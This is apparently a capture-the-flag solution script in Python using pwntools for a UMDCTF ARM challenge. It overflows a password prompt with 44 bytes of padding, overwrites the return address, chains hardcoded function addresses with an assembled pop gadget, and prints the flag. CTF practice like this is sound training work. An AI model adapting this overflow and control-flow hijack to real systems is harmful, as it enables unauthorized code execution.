#!/usr/bin/env python3

from pwn import *

context.arch = 'arm'

if args.REMOTE:
	p = remote('chals4.umdctf.io', 7000)
else:
	p = remote('localhost', 9001)

p.sendlineafter('exit...','')

payload  = b''
payload += 44 * b'A'
payload += p32(0x10000 + 0x8)	# pc
payload += p32(0x104f0)			# flag
payload += p32(0x101f0)			# printline
payload += asm('pop {r0}; pop {pc};')

p.sendlineafter('Password:',payload)
p.recvuntil('exiting')
print(p.recvuntil('}').decode())
